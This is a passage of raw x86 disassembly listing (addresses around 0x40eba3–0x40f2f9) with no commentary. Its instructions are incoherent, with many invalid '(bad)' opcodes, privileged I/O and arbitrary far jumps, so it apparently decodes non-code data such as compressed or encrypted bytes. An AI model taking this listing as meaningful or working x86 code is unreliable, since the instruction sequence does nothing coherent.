  40eba3:	and    DWORD PTR [esi+ebp*2],ebx
  40eba6:	dec    ebx
  40eba7:	fwait
  40eba8:	aaa    
  40eba9:	sbb    eax,0x3f1a991
  40ebae:	mov    BYTE PTR [ebx-0x2b58c2d6],al
  40ebb4:	dec    esp
  40ebb5:	jge    0x40ebb3
  40ebb7:	scas   eax,DWORD PTR es:[edi]
  40ebb8:	push   ebp
  40ebb9:	or     bh,BYTE PTR [esi-0x2872814a]
  40ebbf:	out    0xd3,al
  40ebc1:	sub    al,BYTE PTR [eax+0x1d844bbf]
  40ebc7:	or     edi,DWORD PTR [ebp*1-0x2720e75d]
  40ebce:	shl    DWORD PTR [ebp-0x45],cl
  40ebd1:	xor    esp,0x537483f3
  40ebd7:	add    DWORD PTR ds:0xd2a04436,edi
  40ebdd:	mov    al,ds:0xdb8e7dc9
  40ebe2:	sysexit 
  40ebe4:	in     al,dx
  40ebe5:	loopne 0x40eb79
  40ebe7:	jp     0x40eb6e
  40ebe9:	and    al,0x6a
  40ebeb:	shl    DWORD PTR [ecx],cl
  40ebed:	xor    ebx,0xffffffb2
  40ebf0:	cli    
  40ebf1:	dec    ecx
  40ebf2:	pop    edx
  40ebf3:	aaa    
  40ebf4:	xchg   ebp,eax
  40ebf5:	mov    ds:0xe26bd6ac,eax
  40ebfa:	out    0x64,eax
  40ebfc:	mov    edi,0x90111c13
  40ec01:	mov    edx,0xb58f8dfa
  40ec06:	into   
  40ec07:	sbb    al,0x45
  40ec09:	jnp    0x40ec47
  40ec0b:	mov    cl,0xdf
  40ec0d:	inc    esi
  40ec0e:	js     0x40ec76
  40ec10:	mov    edi,0x1d3aea85
  40ec15:	out    0x37,al
  40ec17:	and    eax,0x707d0f20
  40ec1c:	or     eax,0xfd421f78
  40ec21:	push   es
  40ec22:	xor    ebx,DWORD PTR [ebx+0x22]
  40ec25:	and    BYTE PTR [eax+0xa63c559],ah
  40ec2b:	popa   
  40ec2c:	and    al,0x6c
  40ec2e:	lods   al,BYTE PTR ds:[esi]
  40ec2f:	bound  esp,QWORD PTR [eax]
  40ec31:	pop    edx
  40ec32:	mov    ds:0x22412092,al
  40ec37:	mov    edx,DWORD PTR [ecx-0x7a5733b4]
  40ec3d:	xor    BYTE PTR [ebx-0x6e926fce],dl
  40ec43:	xchg   edi,eax
  40ec44:	push   ebx
  40ec46:	adc    BYTE PTR [ebx],0xfa
  40ec49:	and    BYTE PTR [ebx],ah
  40ec4b:	popf   
  40ec4c:	bound  ebx,QWORD PTR [edx+0x3e728de0]
  40ec52:	push   es
  40ec53:	repnz test BYTE PTR [ebp-0x3c950050],0x1d
  40ec5b:	pop    esi
  40ec5c:	loop   0x40ebff
  40ec5e:	push   cs
  40ec5f:	mov    ecx,0x6524084e
  40ec64:	dec    edi
  40ec65:	into   
  40ec66:	stc    
  40ec67:	imul   ebp,DWORD PTR [ecx-0x4d],0xffffffd7
  40ec6b:	(bad)  
  40ec6c:	jnp    0x40ec0e
  40ec6e:	fild   QWORD PTR [esi]
  40ec70:	lods   eax,DWORD PTR ds:[esi]
  40ec71:	hlt    
  40ec72:	mov    al,ds:0xce5efeeb
  40ec77:	cdq    
  40ec78:	je     0x40ecd9
  40ec7a:	cmc    
  40ec7b:	int    0x7
  40ec7d:	sbb    BYTE PTR [edx*2-0x4aeebabb],0x13
  40ec85:	xor    BYTE PTR [eax+0x5d048db],dh
  40ec8b:	dec    ebp
  40ec8c:	or     DWORD PTR [edi],ebp
  40ec8e:	outs   dx,DWORD PTR ds:[esi]
  40ec8f:	lahf   
  40ec90:	retf   
  40ec91:	mov    BYTE PTR [eax+0x2],ah
  40ec94:	push   ss
  40ec95:	sbb    al,0x8e
  40ec97:	test   al,0x52
  40ec99:	mov    ecx,0xc3c427cd
  40ec9e:	fidiv  DWORD PTR [edx+0x10]
  40eca1:	and    ah,BYTE PTR [ebp-0xa]
  40eca4:	es cmp eax,0x9bf8d2ea
  40ecaa:	(bad)  
  40ecab:	xor    al,0x88
  40ecad:	lods   al,BYTE PTR ds:[esi]
  40ecae:	test   bl,bl
  40ecb0:	xchg   ebx,eax
  40ecb1:	xor    al,0x63
  40ecb3:	xchg   esi,eax
  40ecb4:	adc    BYTE PTR [edi+0x40],0x80
  40ecb8:	dec    ebx
  40ecb9:	push   ebx
  40ecba:	lea    edx,[esi]
  40ecbc:	ja     0x40ecf4
  40ecbe:	fimul  WORD PTR [eax-0x216ab29f]
  40ecc4:	idiv   DWORD PTR [edx+0x3969aaf1]
  40ecca:	enter  0xae16,0xf4
  40ecce:	nop
  40eccf:	sbb    al,0xbe
  40ecd1:	sbb    DWORD PTR [edx+0x1f],esp
  40ecd4:	dec    eax
  40ecd5:	sub    eax,0xe3002b84
  40ecda:	repz mov ecx,DWORD PTR [edi+eax*4-0x14]
  40ecdf:	or     esp,0xf5b4b5c5
  40ece5:	push   ecx
  40ece6:	pop    esp
  40ece7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ece8:	(bad)  
  40ece9:	retf   0x6902
  40ecec:	popf   
  40eced:	xor    edi,DWORD PTR [edx+0x6d8ac953]
  40ecf3:	dec    edi
  40ecf4:	add    DWORD PTR [eax-0x69],0xe4c3b5df
  40ecfb:	fwait
  40ecfc:	sbb    edi,DWORD PTR [ebx+edx*8-0x3a]
  40ed00:	cld    
  40ed01:	xor    eax,0x735c067d
  40ed06:	xor    edx,DWORD PTR [edx]
  40ed08:	out    0xa8,al
  40ed0a:	ja     0x40ecbd
  40ed0c:	aad    0xa2
  40ed0e:	les    ebx,FWORD PTR [esi]
  40ed10:	cmp    BYTE PTR [esi],0x9e
  40ed13:	and    al,0xd2
  40ed15:	pushf  
  40ed16:	(bad)  
  40ed18:	into   
  40ed19:	scas   eax,DWORD PTR es:[edi]
  40ed1a:	add    eax,0xc19a5240
  40ed1f:	add    ah,BYTE PTR [edx]
  40ed21:	xor    DWORD PTR [edx],ecx
  40ed23:	cmp    eax,0x38d13467
  40ed28:	loopne 0x40ecb0
  40ed2a:	adc    eax,0xf1c4580f
  40ed2f:	test   BYTE PTR [ecx-0x5e195328],ch
  40ed35:	cwde   
  40ed36:	sub    cl,BYTE PTR [esi+0x77]
  40ed39:	mov    dl,0x96
  40ed3b:	or     BYTE PTR [edi+0x1a59711b],0xd6
  40ed42:	mov    esp,0x6fcde7e2
  40ed47:	pop    edx
  40ed48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed49:	sbb    al,0xde
  40ed4b:	inc    edi
  40ed4c:	sbb    eax,0xbfac94fa
  40ed51:	and    BYTE PTR [edi-0x26cb81f9],bl
  40ed57:	lds    ebp,FWORD PTR [ecx+0x5e]
  40ed5a:	stos   BYTE PTR es:[edi],al
  40ed5b:	xchg   ebp,eax
  40ed5c:	sti    
  40ed5d:	mov    ch,0x21
  40ed5f:	or     DWORD PTR [eax],0xffffffb5
  40ed62:	gs in  eax,0x3a
  40ed65:	out    0x40,eax
  40ed67:	or     eax,0x1203b95c
  40ed6c:	div    DWORD PTR [esi+ebx*8-0x35]
  40ed70:	mov    edi,0x4c4a634a
  40ed75:	aam    0x65
  40ed77:	jecxz  0x40eda8
  40ed79:	das    
  40ed7a:	xchg   BYTE PTR [ebp+0x73],al
  40ed7d:	mov    fs,WORD PTR [edx]
  40ed7f:	dec    ebp
  40ed80:	mov    al,0x56
  40ed82:	(bad)  
  40ed83:	push   ecx
  40ed84:	xor    ecx,eax
  40ed86:	call   0x9b57:0xf049fb4b
  40ed8d:	cwde   
  40ed8e:	out    dx,eax
  40ed8f:	and    ecx,DWORD PTR [edx]
  40ed91:	inc    ebp
  40ed92:	jmp    FWORD PTR [ebx+0x7b050c95]
  40ed98:	test   BYTE PTR [eax],dl
  40ed9a:	mov    esi,0xedf209df
  40ed9f:	jge    0x40ee1d
  40eda1:	ins    BYTE PTR es:[edi],dx
  40eda2:	div    DWORD PTR [ecx-0x41]
  40eda5:	cmp    al,0xe
  40eda7:	jo     0x40edf0
  40eda9:	xchg   edi,eax
  40edaa:	(bad)  
  40edab:	lods   al,BYTE PTR ds:[esi]
  40edac:	(bad)  
  40edad:	or     DWORD PTR [ebx],esp
  40edaf:	data16 fwait
  40edb1:	add    ebx,DWORD PTR [edi-0x41]
  40edb4:	adc    dl,bh
  40edb6:	ja     0x40ed9a
  40edb8:	adc    BYTE PTR [esi+0xd],ch
  40edbb:	mov    WORD PTR [ecx-0xd97f5ed],es
  40edc1:	out    dx,al
  40edc2:	fisttp WORD PTR [ecx-0x876064b]
  40edc8:	ret    0xf154
  40edcb:	xchg   ebx,eax
  40edcc:	loop   0x40edf3
  40edce:	stos   BYTE PTR es:[edi],al
  40edcf:	pop    es
  40edd0:	cmp    eax,0xd4e87846
  40edd5:	inc    ecx
  40edd6:	call   0x9070:0x86e58c55
  40eddd:	leave  
  40edde:	call   0x79e0632
  40ede3:	mov    dh,0xb5
  40ede5:	or     ah,BYTE PTR [ebx]
  40ede7:	in     al,dx
  40ede8:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  40edea:	pop    ds
  40edeb:	sbb    al,0x92
  40eded:	inc    ebx
  40edee:	sbb    eax,0xd42ea2ed
  40edf3:	in     eax,dx
  40edf4:	icebp  
  40edf5:	in     al,dx
  40edf6:	jp     0x40ee47
  40edf8:	and    al,BYTE PTR [edx]
  40edfa:	push   es
  40edfb:	test   eax,0x288e4807
  40ee00:	jo     0x40ee34
  40ee02:	lea    ebx,[ecx]
  40ee04:	push   cs
  40ee05:	ret    0xb301
  40ee08:	mov    fs,WORD PTR [esi+edx*8-0x5700b0ba]
  40ee0f:	fcmovnbe st,st(0)
  40ee11:	dec    esp
  40ee12:	imul   edx,DWORD PTR [ebp-0x7d],0x48
  40ee16:	int3   
  40ee17:	pop    ecx
  40ee18:	jbe    0x40edd5
  40ee1a:	mov    ds:0x7106ed1a,al
  40ee1f:	out    dx,al
  40ee20:	xlat   BYTE PTR ds:[ebx]
  40ee21:	or     sp,ax
  40ee24:	sub    al,dh
  40ee26:	mov    ebp,0x711e12d0
  40ee2b:	push   ecx
  40ee2c:	inc    esi
  40ee2d:	inc    edi
  40ee2e:	inc    ebx
  40ee2f:	dec    esp
  40ee30:	jnp    0x40ee87
  40ee32:	ret    
  40ee33:	es in  eax,dx
  40ee35:	push   ecx
  40ee36:	pop    edi
  40ee37:	dec    esp
  40ee38:	retf   
  40ee39:	mov    eax,ds:0x135d16a9
  40ee3e:	fist   DWORD PTR [edx]
  40ee40:	ja     0x40ee19
  40ee42:	add    ch,cl
  40ee44:	or     dl,dh
  40ee46:	and    ebx,DWORD PTR [ebx-0x11]
  40ee49:	je     0x40ee46
  40ee4b:	sti    
  40ee4c:	cwde   
  40ee4d:	mov    ds:0x40e711bf,al
  40ee52:	mov    DWORD PTR [esi],ebx
  40ee54:	ins    DWORD PTR es:[edi],dx
  40ee55:	call   FWORD PTR [ecx+0x3992b999]
  40ee5b:	lds    edi,FWORD PTR [eax+0x7]
  40ee5e:	scas   al,BYTE PTR es:[edi]
  40ee5f:	sbb    al,0xd6
  40ee61:	mov    esi,0x8ec76478
  40ee66:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  40ee68:	xchg   BYTE PTR [ebp-0x1d],bh
  40ee6b:	lds    eax,FWORD PTR [ebx-0xd]
  40ee6e:	(bad)  
  40ee6f:	out    0x8d,eax
  40ee71:	pop    ebx
  40ee72:	push   edi
  40ee73:	je     0x40edf7
  40ee75:	mov    bh,dl
  40ee77:	inc    esi
  40ee78:	gs inc ebx
  40ee7a:	pop    eax
  40ee7b:	retf   0x3ee8
  40ee7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ee7f:	adc    cl,bl
  40ee81:	jns    0x40ee57
  40ee83:	pop    eax
  40ee84:	inc    ebx
  40ee85:	stos   BYTE PTR es:[edi],al
  40ee86:	stc    
  40ee87:	lods   al,BYTE PTR ds:[esi]
  40ee88:	jno    0x40ef02
  40ee8a:	mov    ch,0xb5
  40ee8c:	cmp    ebx,ebp
  40ee8e:	rcr    BYTE PTR [edi],1
  40ee90:	jp     0x40eef7
  40ee92:	mov    edi,0x99a16f14
  40ee97:	mov    esp,0xc61c6da1
  40ee9c:	leave  
  40ee9d:	xchg   ebx,eax
  40ee9e:	sar    DWORD PTR ds:0xe08bb75c,0x3f
  40eea5:	adc    eax,0x5236181a
  40eeaa:	(bad)  
  40eeab:	out    0x9d,eax
  40eead:	popa   
  40eeae:	xchg   ebp,eax
  40eeaf:	call   0xf922fc8f
  40eeb4:	jnp    0x40eed0
  40eeb6:	add    al,0xc5
  40eeb8:	ins    BYTE PTR es:[edi],dx
  40eeb9:	into   
  40eeba:	sbb    eax,0xcd9cf373
  40eebf:	pop    ss
  40eec0:	lds    eax,FWORD PTR [edi+0x73]
  40eec3:	mov    BYTE PTR [edx-0x62],al
  40eec6:	jae    0x40ef37
  40eec8:	push   ebp
  40eec9:	fmul   DWORD PTR [edi-0x147a47bf]
  40eecf:	push   edi
  40eed0:	repz mov edi,0xa0328062
  40eed6:	loop   0x40ee8e
  40eed8:	fidivr DWORD PTR [esi-0x5d]
  40eedb:	bound  ebp,QWORD PTR [esi+0x12]
  40eede:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eedf:	push   edi
  40eee0:	inc    edi
  40eee1:	mov    edx,0x3ba1de6e
  40eee6:	pusha  
  40eee7:	push   es
  40eee8:	xor    al,0x3c
  40eeea:	pushf  
  40eeeb:	or     bl,BYTE PTR [edi-0x73]
  40eeee:	inc    ebp
  40eeef:	dec    ecx
  40eef0:	xlat   BYTE PTR ds:[ebx]
  40eef1:	xor    eax,edx
  40eef3:	std    
  40eef4:	mov    WORD PTR [ebx+0x47],fs
  40eef7:	pop    ebp
  40eef8:	arpl   WORD PTR [ebx-0x267345e],si
  40eefe:	call   0x48df:0x78d592ae
  40ef05:	int    0x2f
  40ef07:	mov    al,ds:0xfad05a05
  40ef0c:	mov    esp,0x84c842c8
  40ef11:	es retf 
  40ef13:	popf   
  40ef14:	or     DWORD PTR [edi],ecx
  40ef16:	aas    
  40ef17:	xor    eax,0x1a3e155b
  40ef1c:	test   BYTE PTR [edx],al
  40ef1e:	inc    edi
  40ef1f:	push   ebx
  40ef20:	xor    al,0x5d
  40ef22:	and    dl,ch
  40ef24:	cmp    ch,0x75
  40ef27:	addr16 jp 0x40ef9a
  40ef2a:	mov    bh,BYTE PTR [eax+ecx*1]
  40ef2d:	loopne 0x40eec1
  40ef2f:	pop    eax
  40ef30:	iret   
  40ef31:	rol    BYTE PTR [edi-0x24],cl
  40ef34:	pop    edx
  40ef35:	or     al,0xf6
  40ef37:	leave  
  40ef38:	(bad)  
  40ef39:	and    DWORD PTR [esi-0x49fe71df],ebx
  40ef3f:	enter  0xf802,0x1
  40ef43:	(bad)  
  40ef44:	push   ecx
  40ef45:	sahf   
  40ef46:	out    dx,eax
  40ef47:	in     al,dx
  40ef48:	jae    0x40ef6e
  40ef4a:	push   cs
  40ef4b:	xchg   edx,eax
  40ef4c:	(bad)
  40ef50:	jg     0x40eedc
  40ef52:	test   BYTE PTR [ebp-0x4b45fc0f],dl
  40ef58:	push   esp
  40ef59:	in     al,dx
  40ef5a:	xlat   BYTE PTR ds:[ebx]
  40ef5b:	mov    bl,0xa0
  40ef5d:	inc    esi
  40ef5e:	pop    ss
  40ef5f:	dec    eax
  40ef60:	and    DWORD PTR [esi-0x2d],ecx
  40ef63:	mov    al,0xd9
  40ef65:	aad    0x13
  40ef67:	jge    0x40ef7c
  40ef69:	clc    
  40ef6a:	fidivr DWORD PTR [eax+0x37]
  40ef6d:	add    BYTE PTR [ebp-0x3],bh
  40ef70:	sbb    edi,DWORD PTR [edx]
  40ef72:	push   esp
  40ef73:	lods   al,BYTE PTR ds:[esi]
  40ef74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef75:	test   BYTE PTR [ebx+0x46],0x6c
  40ef79:	cmp    eax,0x5fe109ea
  40ef7e:	inc    ebx
  40ef7f:	cmp    BYTE PTR [edi],ah
  40ef81:	frstor [eax]
  40ef83:	data16 int 0x95
  40ef86:	sbb    BYTE PTR [esi],bh
  40ef88:	cmp    DWORD PTR [esi+0x46],eax
  40ef8b:	fild   WORD PTR [ebp+ebx*2+0x170cda8]
  40ef92:	enter  0x1583,0xf4
  40ef96:	xlat   BYTE PTR ds:[ebx]
  40ef97:	rcl    BYTE PTR ds:0x4613e1bb,0xd3
  40ef9e:	nop
  40ef9f:	xchg   ch,ch
  40efa1:	jle    0x40ef8f
  40efa3:	fst    DWORD PTR [ebx-0x3d26b8d6]
  40efa9:	jmp    0x70db:0xe2fd2337
  40efb0:	adc    dh,BYTE PTR ds:0x9106754a
  40efb6:	mov    ds:0x205a9ec6,eax
  40efbb:	clc    
  40efbc:	jmp    0x8bb5e678
  40efc1:	ret    0x4e22
  40efc4:	push   eax
  40efc5:	int3   
  40efc6:	inc    edi
  40efc7:	daa    
  40efc8:	stc    
  40efc9:	or     edi,DWORD PTR [ebx-0x2]
  40efcc:	je     0x40efe5
  40efce:	test   eax,0x3fb87c5
  40efd3:	les    esp,FWORD PTR [ebx+0x48]
  40efd6:	add    esi,DWORD PTR [edx+0x81b0db7]
  40efdc:	div    DWORD PTR [edi+0xa]
  40efdf:	push   cs
  40efe0:	jno    0x40f04d
  40efe2:	imul   esp,edx,0x2472264d
  40efe8:	out    dx,eax
  40efe9:	xchg   BYTE PTR ds:0x924596d0,cl
  40efef:	inc    edi
  40eff0:	jmp    0xf383:0xfd0db82a
  40eff7:	push   cs
  40eff8:	outs   dx,DWORD PTR ds:[esi]
  40eff9:	repz ror DWORD PTR [esi-0x643876d1],1
  40f000:	or     BYTE PTR [edi+0x61],ah
  40f003:	sub    BYTE PTR [esi],0x38
  40f006:	dec    ebx
  40f007:	cli    
  40f008:	xchg   edi,edi
  40f00a:	push   0x2c
  40f00c:	jns    0x40f05d
  40f00e:	or     eax,0x15754419
  40f013:	pop    ebx
  40f014:	adc    dh,bl
  40f016:	mov    al,0x2a
  40f018:	(bad)  
  40f019:	call   0x27a1:0x957ed0d3
  40f020:	push   ss
  40f021:	inc    esp
  40f022:	(bad)  
  40f024:	adc    BYTE PTR [ecx],bh
  40f026:	cwde   
  40f027:	xor    eax,0xb42bbbb9
  40f02c:	ret    
  40f02d:	in     eax,dx
  40f02e:	ss stc 
  40f030:	retf   
  40f031:	outs   dx,BYTE PTR ds:[esi]
  40f032:	les    esi,FWORD PTR [ecx]
  40f034:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f035:	test   eax,0x8f9c4cf6
  40f03a:	rol    bh,cl
  40f03c:	ficomp DWORD PTR [esi]
  40f03e:	jle    0x40efe0
  40f040:	cdq    
  40f041:	adc    al,0xa9
  40f043:	cwde   
  40f044:	xchg   ebp,eax
  40f045:	popf   
  40f046:	shl    DWORD PTR [esi+0x74],1
  40f049:	mov    cl,0x2e
  40f04b:	setp   BYTE PTR [eax]
  40f04e:	cmc    
  40f04f:	push   0xc2d65a6
  40f054:	jo     0x40f0c0
  40f056:	push   esi
  40f057:	aas    
  40f058:	xchg   esp,eax
  40f059:	repz (bad) 
  40f05b:	push   eax
  40f05c:	xor    BYTE PTR [edx-0x1a],dl
  40f05f:	les    esi,FWORD PTR [esi+0x7f6e912f]
  40f065:	or     BYTE PTR [edi-0x64],dh
  40f068:	fidivr WORD PTR [ebx-0x53c92a4a]
  40f06e:	jb     0x40f04f
  40f070:	add    esi,DWORD PTR [ebx+0x4c38c0a2]
  40f076:	sbb    al,0xe0
  40f078:	dec    edx
  40f079:	pop    es
  40f07a:	fs inc edx
  40f07c:	aas    
  40f07d:	outs   dx,DWORD PTR ds:[esi]
  40f07e:	inc    esi
  40f07f:	ds dec esi
  40f081:	(bad)
  40f084:	and    bh,BYTE PTR [ecx-0x5767e86e]
  40f08a:	jecxz  0x40f10a
  40f08c:	retf   0x817f
  40f08f:	outs   dx,BYTE PTR ds:[esi]
  40f090:	adc    al,0x89
  40f092:	clc    
  40f093:	in     al,dx
  40f094:	pop    ds
  40f095:	jb     0x40f105
  40f097:	pop    eax
  40f098:	cmc    
  40f099:	adc    ecx,edx
  40f09b:	push   ebp
  40f09c:	addr16 inc edx
  40f09e:	test   al,0x4a
  40f0a0:	gs mov es:0xf1d04fb0,al
  40f0a7:	or     al,ch
  40f0a9:	sar    DWORD PTR [eax+eax*1-0x22],0x1b
  40f0ae:	mov    esi,0xafad908c
  40f0b3:	xchg   edi,eax
  40f0b4:	inc    esi
  40f0b5:	daa    
  40f0b6:	sub    ecx,edi
  40f0b8:	mov    esp,0x74b34b58
  40f0bd:	and    BYTE PTR [edx+0xc],0x65
  40f0c1:	imul   eax,DWORD PTR [edx-0x59300696],0x9f8d8392
  40f0cb:	inc    ebx
  40f0cc:	add    al,0x63
  40f0ce:	mov    ch,0x1a
  40f0d0:	(bad)  
  40f0d1:	xchg   esp,eax
  40f0d2:	js     0x40f14f
  40f0d4:	test   BYTE PTR [ecx+0x1988d8a0],bh
  40f0da:	and    DWORD PTR [edi+0x60e5405e],edx
  40f0e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f0e1:	std    
  40f0e2:	arpl   WORD PTR [edi+edi*2],bx
  40f0e5:	les    ebp,FWORD PTR [ebx]
  40f0e7:	test   al,0x8b
  40f0e9:	xor    esi,DWORD PTR [esi+0x69a267af]
  40f0ef:	mov    ebx,DWORD PTR [esi+0x24]
  40f0f2:	and    eax,0xb6edf1b2
  40f0f7:	push   cx
  40f0f9:	or     eax,DWORD PTR [edi+0xcfcc132]
  40f0ff:	pop    ebp
  40f100:	sub    BYTE PTR [ecx-0x36],dh
  40f103:	into   
  40f104:	add    bl,BYTE PTR [edi+0x14]
  40f107:	mov    edx,DWORD PTR [eax-0x75fc26a2]
  40f10d:	(bad)  
  40f10e:	sub    al,0x2
  40f110:	xchg   edx,eax
  40f111:	mov    cl,0xa4
  40f113:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f114:	and    cl,0xdc
  40f117:	pop    eax
  40f118:	popf   
  40f119:	mov    eax,ds:0x59719315
  40f11e:	into   
  40f11f:	adc    esp,DWORD PTR [edi-0x69]
  40f122:	or     al,0xea
  40f124:	xchg   esp,eax
  40f125:	shr    DWORD PTR [eax],cl
  40f127:	add    al,0x58
  40f129:	call   0xeeb4b226
  40f12e:	repz sbb ebx,DWORD PTR [ebp-0x3e]
  40f132:	adc    BYTE PTR [eax+0x75],bl
  40f135:	inc    esi
  40f136:	pop    ecx
  40f137:	pop    esp
  40f138:	push   0x4b
  40f13a:	fs sub dh,0xd
  40f13e:	pop    ebp
  40f13f:	cwde   
  40f140:	pop    eax
  40f141:	nop
  40f142:	xlat   BYTE PTR fs:[ebx]
  40f144:	push   ds
  40f145:	sub    DWORD PTR [ecx+0x65],edx
  40f148:	xchg   edx,eax
  40f149:	push   ebx
  40f14a:	in     al,0xef
  40f14c:	div    edi
  40f14e:	jecxz  0x40f10d
  40f150:	outs   dx,DWORD PTR ds:[esi]
  40f151:	dec    DWORD PTR [edx]
  40f153:	pop    eax
  40f154:	cs sahf 
  40f156:	pop    ebp
  40f157:	add    eax,0xea49961d
  40f15c:	popf   
  40f15d:	ja     0x40f1d8
  40f15f:	in     eax,0x57
  40f161:	mov    ds:0xa1ce1459,ax
  40f167:	retf   0x6d43
  40f16a:	aas    
  40f16b:	jmp    0xe337c38f
  40f170:	sbb    DWORD PTR [ebp-0x3f],0x3e
  40f174:	out    dx,al
  40f175:	xchg   ebp,eax
  40f176:	loope  0x40f1e1
  40f178:	jb     0x40f16e
  40f17a:	xchg   ebp,eax
  40f17b:	outs   dx,BYTE PTR ds:[esi]
  40f17c:	gs push ebx
  40f17e:	loope  0x40f15f
  40f180:	adc    al,bh
  40f182:	xchg   ecx,eax
  40f183:	das    
  40f184:	hlt    
  40f185:	les    esi,FWORD PTR [edx-0x4a]
  40f188:	gs lahf 
  40f18a:	mov    eax,0xbd76bfc2
  40f18f:	dec    edi
  40f190:	dec    ebx
  40f191:	addr16 jae 0x40f141
  40f194:	cli    
  40f195:	std    
  40f196:	cwde   
  40f197:	stos   BYTE PTR es:[edi],al
  40f198:	mov    dl,BYTE PTR [ebp+0x6dc8cd21]
  40f19e:	xor    dh,0xc3
  40f1a1:	mov    edi,eax
  40f1a3:	jns    0x40f135
  40f1a5:	icebp  
  40f1a6:	mov    edi,DWORD PTR [eax-0x754d1752]
  40f1ac:	mov    ecx,ecx
  40f1ae:	cmp    esi,esp
  40f1b0:	mov    ah,0xc7
  40f1b2:	jae    0x40f15e
  40f1b4:	sbb    DWORD PTR [ebx-0x50],edx
  40f1b7:	or     DWORD PTR [eax-0x2b8a6ef2],edx
  40f1bd:	lea    edi,[edx]
  40f1bf:	ins    DWORD PTR es:[edi],dx
  40f1c0:	outs   dx,BYTE PTR ds:[esi]
  40f1c1:	sub    BYTE PTR es:[eax-0x13],0xf4
  40f1c6:	xor    ebx,DWORD PTR [ecx-0x1d764d15]
  40f1cc:	shl    bh,0xe9
  40f1cf:	inc    ebp
  40f1d0:	jmp    0x19922c0f
  40f1d5:	cmp    DWORD PTR [esi-0x342063bc],ecx
  40f1db:	inc    edi
  40f1dc:	hlt    
  40f1dd:	sub    BYTE PTR [edi],dl
  40f1df:	or     eax,0xdd303899
  40f1e4:	dec    eax
  40f1e5:	ja     0x40f1fb
  40f1e7:	test   DWORD PTR [ebp-0x5ba1e927],edi
  40f1ed:	push   0x3dc0dedc
  40f1f2:	push   eax
  40f1f3:	xlat   BYTE PTR ds:[ebx]
  40f1f4:	(bad)  
  40f1f5:	or     BYTE PTR [eax-0xc7fa392],dh
  40f1fb:	sbb    BYTE PTR [esi],al
  40f1fd:	sbb    bl,bh
  40f1ff:	mul    BYTE PTR ds:0x957d0150
  40f205:	pop    es
  40f206:	cs hlt 
  40f208:	push   esi
  40f209:	dec    ebx
  40f20a:	push   ss
  40f20b:	mov    ss,WORD PTR [eax+0x4f]
  40f20e:	xor    al,0x50
  40f210:	xor    bl,bl
  40f212:	out    0xac,eax
  40f214:	push   0x69
  40f216:	stos   DWORD PTR es:[edi],eax
  40f217:	cmp    ah,BYTE PTR [eax+0x148f09f6]
  40f21d:	cmp    ah,dh
  40f21f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f220:	add    esi,DWORD PTR [esi-0x65d5702b]
  40f226:	out    dx,eax
  40f227:	in     al,dx
  40f228:	bound  esp,QWORD PTR [ecx]
  40f22a:	dec    edx
  40f22b:	sub    eax,0x3d48e3ee
  40f230:	ret    0xc33e
  40f233:	cmc    
  40f234:	lods   eax,DWORD PTR ds:[esi]
  40f235:	adc    al,BYTE PTR [eax+0x754928c7]
  40f23b:	push   edi
  40f23c:	sbb    BYTE PTR [edx-0x2a],bh
  40f23f:	out    0x26,al
  40f241:	xchg   ecx,eax
  40f242:	cmc    
  40f243:	leave  
  40f244:	jp     0x40f1cf
  40f246:	sub    ah,BYTE PTR [ebp+0x78385e61]
  40f24c:	push   ecx
  40f24d:	push   ss
  40f24e:	je     0x40f235
  40f250:	fisttp QWORD PTR [edi-0x17a40a41]
  40f256:	dec    esp
  40f257:	clc    
  40f258:	ret    
  40f259:	jns    0x40f289
  40f25b:	or     BYTE PTR [esi-0x76],ch
  40f25e:	retf   0x4942
  40f261:	dec    ecx
  40f262:	pop    ds
  40f263:	cs dec edi
  40f265:	call   0xd071bc33
  40f26a:	stos   BYTE PTR es:[edi],al
  40f26b:	mov    edi,0x68d6fb6f
  40f270:	mov    BYTE PTR [ecx-0x218080d3],bl
  40f276:	repnz xchg esi,eax
  40f278:	jae    0x40f260
  40f27a:	push   ss
  40f27b:	cld    
  40f27c:	imul   esp,ebx,0xffffffa2
  40f27f:	mov    al,ds:0xccf6b9d0
  40f284:	inc    ecx
  40f285:	adc    BYTE PTR [edi],dh
  40f287:	int    0x91
  40f289:	ret    
  40f28a:	mov    eax,ds:0x818382b6
  40f28f:	mov    esp,DWORD PTR [ebx*4-0x5fb1346c]
  40f296:	popf   
  40f297:	enter  0x1f04,0x25
  40f29b:	mov    esi,0x89098cd9
  40f2a0:	aad    0x89
  40f2a2:	or     eax,0xb894fed
  40f2a7:	xchg   ebp,eax
  40f2a8:	pcmpgtw mm0,QWORD PTR [ebp+0x70]
  40f2ac:	xor    esi,DWORD PTR [edi+0x76]
  40f2af:	sbb    cl,cl
  40f2b1:	fs pop es
  40f2b3:	dec    edi
  40f2b4:	inc    ebp
  40f2b5:	mov    eax,ds:0x1be4335b
  40f2ba:	or     al,0x5
  40f2bc:	xchg   DWORD PTR [esi+0x79],edi
  40f2bf:	push   es
  40f2c0:	jmp    0x11a9:0x7ccf4d9a
  40f2c7:	sub    edi,0x3c9cb885
  40f2cd:	stos   DWORD PTR es:[edi],eax
  40f2ce:	cwde   
  40f2cf:	mov    edx,0xe45406c3
  40f2d4:	ret    
  40f2d5:	shr    DWORD PTR [eax+0x32],cl
  40f2d8:	arpl   WORD PTR [edx-0x58],cx
  40f2db:	jnp    0x40f2ae
  40f2dd:	outs   dx,DWORD PTR ds:[esi]
  40f2de:	outs   dx,BYTE PTR ds:[esi]
  40f2df:	outs   dx,BYTE PTR ds:[esi]
  40f2e0:	sbb    ebp,DWORD PTR [edi+ebp*2]
  40f2e3:	inc    ebp
  40f2e4:	push   0xffffff97
  40f2e6:	ret    0x1c0b
  40f2e9:	or     al,ah
  40f2eb:	inc    ebp
  40f2ec:	adc    ecx,DWORD PTR [esi-0x80]
  40f2ef:	imul   edi,DWORD PTR [esi+0x7a265ccd],0xc3808ad6
  40f2f9:	push   ebx
